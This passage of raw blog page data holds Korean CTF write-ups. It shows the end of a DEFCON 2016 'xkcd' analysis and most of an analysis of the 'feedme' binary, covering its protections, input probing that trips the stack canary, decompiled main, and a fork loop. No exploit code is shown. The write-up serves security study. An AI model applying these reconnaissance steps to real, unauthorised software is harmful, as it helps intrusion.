url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA0UlEQVQY03XM207DIAAAUH7EtetoC4VRLuXSAqOsasyyh2lisvis0fj/H2D8AJLzfEDIVxcu1r+4eFH2EdGZ60x4GNWq3FPTT/tOlYDllKY56CUYH5mcmh5jxjtyxIwTLqu238GuBPh01ksyPtmYhVkOiA7j1FE+jIoKXbe4gqgE+LRpvxqfbfxfIGKE654KwvVR2rolFRxKgIuzckY5oxcnrW56iBltB4QZoYLt4P7hUJeA7fk35q90/l63n5A+B/bGpzsT71zdpf7A9BWRW8kfe2ZCKeUkNAgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./8.png\"\n        title=\"./8.png\"\n        src=\"/static/b547b166c5b8f537383938fe8538dfef/3cb0f/8.png\"\n        srcset=\"/static/b547b166c5b8f537383938fe8538dfef/e9ff0/8.png 180w,\n/static/b547b166c5b8f537383938fe8538dfef/f21e7/8.png 360w,\n/static/b547b166c5b8f537383938fe8538dfef/3cb0f/8.png 708w\"\n        sizes=\"(max-width: 708px) 100vw, 708px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"flag\" style=\"position:relative;\"><a href=\"#flag\" aria-label=\"flag permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>flag</h2>\n<ul>\n<li>flag를 획득할 수 있다.</li>\n</ul>","excerpt":"취약점 분석  기타 정보 statically linked, 64 bit Heartbeat packet 보호기법 No RELRO No Canary found NX enabled No PIE 바이너리 분석 main 함수 분석  flag 파일의 내용을 읽어와 flag 변수에 집어넣는 것을 확인할 수 있다.  flag 변수는 .bss 섹션에 존재하며 전역 변수로 확인된다. 사용자의 입력 값을 토대로 특정 조건을 수행하게 되는데  함수를 바탕으로 문자 단위로 짤라 해당 문자열이 포함되는 지를 확인하고 있다.  strtok 그후 해당 부분에서  까지 잘라 해당 문자열의 값을  전역 변수에 memcpy를 하는 것을 확인할 수 있다.  globals 전역 변수  전역 변수는 총 512바이트이며, 같은 .bss 영역이므로 앞에서 선언된 flag와는 0x200차이가 나는 것을 확인할 수있다.  0x200 바이트 차이  비교 strtok   한 내부의 특 정 정수 값을 바탕으로  함수의 인자로 쓰이는…","frontmatter":{"date":"September 18, 2020","title":"DEFCON 2016 xkcd 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🧻"},"fields":{"slug":"/defcon2016_xkcd_ctf_writeup/"}},"next":{"id":"2ad538d1-c67f-5aac-b533-04c58de3bf2b","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<h2 id=\"바이너리-개요\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\" aria-label=\"바이너리 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 개요</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAmUlEQVQI11XG2wqCMAAAUH+klN3UqbMtnc05LCudjYSSop76/7+IIIjgPBxvcK/BzXZ6dOM8Ts+9vdrzvXc30zndWrNzvGzpSmVcx6zK1ybJVcw2KVcZt57Uh8roWpZ9owtZRmkaM4Yp9RH0MfIxCjBeQvgPLUAASOEJecnEkVJdiq2IdUTqACtAahg1H6GGYfP9jwGhIsnpDQmNI7v/hJRFAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/58cf3fddb230a4806e842b381299afb8/37523/0.png\"\n        srcset=\"/static/58cf3fddb230a4806e842b381299afb8/e9ff0/0.png 180w,\n/static/58cf3fddb230a4806e842b381299afb8/f21e7/0.png 360w,\n/static/58cf3fddb230a4806e842b381299afb8/37523/0.png 720w,\n/static/58cf3fddb230a4806e842b381299afb8/a8417/0.png 941w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>보호 기법</p>\n<ul>\n<li>stripped</li>\n<li>statically linked</li>\n<li>32 bit</li>\n</ul>\n<h2 id=\"보호기법\" style=\"position:relative;\"><a href=\"#%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95\" aria-label=\"보호기법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>보호기법</h2>\n<ul>\n<li>No RELRO</li>\n<li>Canary found</li>\n<li>NX enabled</li>\n<li>PIE disabled</li>\n</ul>\n<h2 id=\"바이너리-분석\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EB%B6%84%EC%84%9D\" aria-label=\"바이너리 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAqklEQVQY053LORKCMABA0dxDkGwsAcEgiQECYREQKZSx8f43cYbCwk5nXvGbD6blZS5P3dyrdq27VTcPVS0in8/lwuVwUhMXQypHUdxYXHM5JFkvijk6mlSOoJuuZ21UWSttRK65UFyoIOYRz4KEW5BYiG6ITVwbExvTHSQ2di1EQV412D84NHAoc2iwJz50GfJC5IXQC6HLPhz63aA0HfLCbf4Z0G3/9/wGiM0yplEohccAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/11625927a76f72f4a6ec20acec8cc1e8/37523/1.png\"\n        srcset=\"/static/11625927a76f72f4a6ec20acec8cc1e8/e9ff0/1.png 180w,\n/static/11625927a76f72f4a6ec20acec8cc1e8/f21e7/1.png 360w,\n/static/11625927a76f72f4a6ec20acec8cc1e8/37523/1.png 720w,\n/static/11625927a76f72f4a6ec20acec8cc1e8/9f82e/1.png 820w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>로직 분석1</p>\n<ul>\n<li><code class=\"language-text\">feedme</code> 바이너리의 입력 값으로 <code class=\"language-text\">A</code> 를 <code class=\"language-text\">0x41</code> 입력한 결과 SSP가 켜지는 것을 확인할 수 있으며 해당 바이너리에는 카나리가 존재하는 것을 확인할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.666666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAe0lEQVQI12Pw8E1ycPHVMbTW0rcEIytNPQttfUttMFdD11xLz1JDx0zH0FpVy0RD10Jdx1zbwFJN20xdx5zBwyfaxsFZXlldRlFFVkkVD5JTVkNmyymrMbh5RVja2SmoasirqONGakgkXESNwcs/zd7ZT1nDRFHNiFQEAO1yKAWTkLwOAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./2.png\"\n        title=\"./2.png\"\n        src=\"/static/8a0c14e4baea697b61cf6107a4ad1355/37523/2.png\"\n        srcset=\"/static/8a0c14e4baea697b61cf6107a4ad1355/e9ff0/2.png 180w,\n/static/8a0c14e4baea697b61cf6107a4ad1355/f21e7/2.png 360w,\n/static/8a0c14e4baea697b61cf6107a4ad1355/37523/2.png 720w,\n/static/8a0c14e4baea697b61cf6107a4ad1355/9d76a/2.png 829w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>로직 분석2</p>\n<ul>\n<li>하지만 <code class=\"language-text\">feedme</code> 바이너리의 입력 값으로 <code class=\"language-text\">A</code>를 <code class=\"language-text\">0x40</code> 번 입력한 결과 SSP 켜지지 않는 것으로 보아 앞의 첫 바이트의 입력 값이 해당 다음 입력 값 즉, 문자열의 길이 값이 되는 것을 추측할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 17.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAvUlEQVQI13XGQY6DIBQAUE/STFIdBcSP8EGEgkrV1jRt2qaLuf9JJh6gyVu8zJ5uMb1Dek7LZ9n+YnpJM6O9YH/hchTqXIso8FwyW5BuR22+x+YEMzckN6Q+jqr32gXjg3ZBWQ/Y1S02ylBoAbuqBgqy4sCEKjmQ/Szz49qHZPyINv4y4NJw2VVcUlAUFAFFGskEkkaWvKWATOha6JK1x4pk8/W+Pd7r7TnNW5hW4wY/LULbgjU/BfmOHvL8HzDAMCsdUW30AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./3.png\"\n        title=\"./3.png\"\n        src=\"/static/7d8e3ef1f2c06de1ff2d556400940e4a/37523/3.png\"\n        srcset=\"/static/7d8e3ef1f2c06de1ff2d556400940e4a/e9ff0/3.png 180w,\n/static/7d8e3ef1f2c06de1ff2d556400940e4a/f21e7/3.png 360w,\n/static/7d8e3ef1f2c06de1ff2d556400940e4a/37523/3.png 720w,\n/static/7d8e3ef1f2c06de1ff2d556400940e4a/f2d92/3.png 1027w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>systemcall</p>\n<ul>\n<li>system 호출 범위를 분석하던 중 <code class=\"language-text\">SIGCHILD</code> 시그널을 보낸 후 <code class=\"language-text\">write</code> 함수를 바탕으로 <code class=\"language-text\">Child exit</code> 출력을 하는 것을 확인할 수 있으며 다시 자식 프로세스를 생성하는 것을 확인할 수 있다. 이로 인해 해당 바이너리는 <code class=\"language-text\">fork</code> 함수를 바탕으로 자식 프로세스를 생성하는 로직을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"main-함수-분석\" style=\"position:relative;\"><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"main 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>main 함수 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 520px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 77.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAAsTAAALEwEAmpwYAAABxUlEQVQoz41Ty27bMBD0//9OTkEOya0FEhewK8SGJMuyLIsSRdKmSPH9KBS1RdA4jYkBwcPOzO6QXDw/o5cXtF5fINT7vc0ys9tZQgzsdd9rCPXxaMrSVJWpa3M4TIeuMwhNWACgEQoYhxCilNYYr7Wz1sUb1mIYbIwxhAnbba+UrY9DXqAj7KmiXPOPnLk4hHfkGGPTMGM9wbJqUEF2Z3Ghknof5o6McUJYY9wV5xhjWZ6d8wCwJIFty6uSlRU5ka5HnDGF8VjXlBBxnZznRAjTdWy5bJKkyzJMqWw50NZyFoX4fOa5bSnNOLq21ZzbYVCMamWV1p7SyPnvsuvkNMXWutOJvb6i/f6c/ISrTYXYWTn1J6rgvb+adgCAhRAh5GmKMBaHA93kpyMC2qn4pm6tlVLOKh9nxlo7ANh63eY5bho2jmrUygf3xT3HGKuKKmUxFnlONpt+9r/pkbyRL1o7jEWa4t3u3LbcGO//Sek9mdKJPKeQZWQYVN+Pyx/1t++HqqJ/db90Dk1Dx1FKaRmXLtoYovPBf44FpS6EOAyTeVGIotDupk/x5nx3B+7vwcMDXK3Y46N4ehqThG+3fLOd9v/jFy22lSwJEdTQAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4.png\"\n        title=\"./4.png\"\n        src=\"/static/6697a2c2b8d19ca8f31b9959bf080b46/69902/4.png\"\n        srcset=\"/static/6697a2c2b8d19ca8f31b9959bf080b46/e9ff0/4.png 180w,\n/static/6697a2c2b8d19ca8f31b9959bf080b46/f21e7/4.png 360w,\n/static/6697a2c2b8d19ca8f31b9959bf080b46/69902/4.png 520w\"\n        sizes=\"(max-width: 520px) 100vw, 520px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>main 함수 분석</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">\n<span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token function\">ssignal</span><span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span> sub_8048E24<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">alarm</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x96u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">sub_804F820</span><span class=\"token punctuation\">(</span>off_80EA4BC<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">sub_80490B0</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>main 함수 내부에서는 <code class=\"language-text\">alarm</code>, <code class=\"language-text\">ssignal</code>, <code class=\"language-text\">setvbuf</code> 함수를 바탕으로 기본적인 초기화 과정을 거치며 <code class=\"language-text\">sub_80490B0</code> 함수를 호출하는 것을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"sub_80490b0-함수-분석\" style=\"position:relative;\"><a href=\"#sub_80490b0-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"sub_80490b0 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>sub_80490B0 함수 분석</h2>\n<ul>\n<li><code class=\"language-text\">sub_80490B0</code> 함수를 <code class=\"language-text\">solve</code> 라 명칭하겠다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 67.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAAsTAAALEwEAmpwYAAABvUlEQVQoz2WR6ZIaMQyE5/0fMJUsu1vAMBdz+D4ky1JqCEsBcenf57Zb3c316tp2HUdjbXGOvCfn7nM82r438xysLca8U+eoOZ22cYzDEJeFjJGcpRRhFhFZ13Q8bpeL6fuwrvUfrVUepzmflr4PlzZOA0xT0VqslRj3e+MYv7/nrovLwusq8yxK3fXM+zQRKhJXESDGwrXy42Fri/cAUIkYgADqM91/dn8Gc1jU73n71aXZlidX6wpaY4zZe1jXnBKW8iqOg1mOYfoM9uIk4zO7RViUwmUpOb3I7mLj+ftUTx0NxmxJ6aQt2JRLKRwTaU3nNo9a6byZbBzalKj82GtiQK0wBkaoORPRDvgW960bNIaCFwROiQDoQXdxCDRNteuzT9nHBFiebRtD8wLD7HzMKZXyHMlu2/DnQdoL6GCgJiz0YCEUtck0h4AOK75FfbMdS0o1RqRamblyfbgyBkPAnGuIULnuRb3KG+fk40NOZ7ia2aN32SPS4+dtk+5qVFo9OJ/De899z4cPOfdWZx0w0t4k/+xM7aV+ta6bVYTM/5XVxCjOSYylMrEwUS3lnplSCMCIAkC8L/O+818mDywZmPR0wQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./5.png\"\n        title=\"./5.png\"\n        src=\"/static/2a8f1592256c22c46abb4254b448d784/37523/5.png\"\n        srcset=\"/static/2a8f1592256c22c46abb4254b448d784/e9ff0/5.png 180w,\n/static/2a8f1592256c22c46abb4254b448d784/f21e7/5.png 360w,\n/static/2a8f1592256c22c46abb4254b448d784/37523/5.png 720w,\n/static/2a8f1592256c22c46abb4254b448d784/f1d1f/5.png 739w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>sub_80490B0</p>\n<ul>\n<li><code class=\"language-text\">0x31F</code> 반복을 돌면서 각각의 내부 조건을 수행하게 되는 것을 확인할 수 있다.</li>\n<li><code class=\"language-text\">sub_806CC70</code> 함수를 확인해 보면 내부적으로 __lib_fork 함수를 사용하는 것을 확인할 수 있으며 해당 부분에서 자식 프로세스를 생성하는 것을 확인할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA4klEQVQY0y2H0Y6DIBAA/f9vu5dL0+Y4q1VQBHYXsFCsluKl7SWTyUwl2ijq9fewnY9J85vXafHb4h/Jbcm/eO+W3Nsf3Jr8FmitTINtoznnkxSgpYPJ0ggoZqucnbx9LeFgSRrgABxRBAezV16OlUcS63AJ3fnaXELP49AHcfbtEGU7dyfLfmxd+6YLnLn6ROxEbIyTSEqZsbr2xowtyIsaGi4YHxgojoqj5laPkWDzfrE2kokEN4KAOqJZHN0nrPA44VcnvxkdWIF5L6U8HiXnkvOen/uz/PtDLvtz/3Re8x+AtRXIncJ+1wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6.png\"\n        title=\"./6.png\"\n        src=\"/static/65cd5350cc7e3cb56386d42994f0a2de/37523/6.png\"\n        srcset=\"/static/65cd5350cc7e3cb56386d42994f0a2de/e9ff0/6.png 180w,\n/static/65cd5350cc7e3cb56386d42994f0a2de/f21e7/6.png 360w,\n/static/65cd5350cc7e3cb56386d42994f0a2de/37523/6.png 720w,\n/static/65cd5350cc7e3cb56386d42994f0a2de/bad1b/6.png 841w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>fork 함수</p>\n<h2 id=\"sub_804f700-feedme-함수-분석\" style=\"position:relative;\"><a href=\"#sub_804f700-feedme-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"sub_804f700 feedme 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>sub_804F700 [feedme] 함수 분석</h2>\n<ul>\n<li><code class=\"language-text\">sub_804F700</code> 함수를 feedme 로 명칭하겠다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.99999999999999%; position: relative; bottom: 0; left: 0; background-image: 